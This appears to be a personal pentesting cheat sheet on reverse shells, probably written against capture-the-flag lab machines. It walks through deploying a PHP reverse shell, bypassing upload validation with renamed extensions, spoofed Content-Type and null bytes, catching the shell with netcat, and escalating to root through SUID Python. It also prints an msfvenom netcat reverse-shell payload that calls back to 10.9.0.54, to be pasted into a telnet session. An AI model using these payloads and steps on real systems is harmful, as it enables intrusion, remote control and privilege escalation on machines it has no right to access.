# Reverse Shell

Hacker's machine acts as a server. 
It opens a communication channel on a port and waits for incoming connections. 
Victim's machine acts as a client and initiates a connection to hackers's listening server.

Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

---
## PHP Reverse Shell

### Script

1. Download PHP script from https://github.com/pentestmonkey/php-reverse-shell
2. Change `IP` and `PORT`to your host IP and random PORT.


### How to bypass validation in uploading forms

* Try to rename php file differently, eg. changing extensions to .phtml or .php.jpg
* Try to change Content-type filtering i.e., changing Content-Type: txt/php to image/jpg
* Try to add special characters to bypass pic.php%00 , pic.php%0a, pic.php%00

### Script deployment & access granting

1. Keep listening on port you choose and included in PHP script.
```
$ nc -lnvp <port>
```
2. Run script or wait if someone will run it. You should get similar output from netcat command:
```
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:17:34 up 28 min,  0 users,  load average: 0.00, 0.01, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And now you have access to www-data user. 

### Escalete to root

1. Look for the files with SUID permission:
```
$ find / -type f -user root -perm -4000 2>/dev/null
```

2. If you have /usr/bin/python on a list, use tool Gtfobins -> https://gtfobins.github.io/
```
$ python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
```

3. Check who are you:
```
$ whoami
root
```

Root is yours! Congrats!

---

## Netcat Reverse Shell

Case: Telnet connection

### Script

Generate and encode a netcat reverse shell:
```
$ msfvenom -p cmd/unix/reverse_netcat lhost=<local_IP> lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 91 bytes
mkfifo /tmp/wqivu; nc 10.9.0.54 4444 0</tmp/wqivu | /bin/sh >/tmp/wqivu 2>&1; rm /tmp/wqivu
```
* -p - payload
* lhost - local host IP address
* lport - the port to listen on
* R - export the payload in raw format

2. Start a netcat listener:
```
$ nc -lvp <listening_port>
```

3. Copy and paste msfvenom payload into the telnet session 
```
.RUN mkfifo /tmp/wqivu; nc 10.9.0.54 4444 0</tmp/wqivu | /bin/sh >/tmp/wqivu 2>&1; rm /tmp/wqivu
```

5. Check in netcat session, if you have a reverse shell:
```
$ pwd
/root
```

Congrats!

---






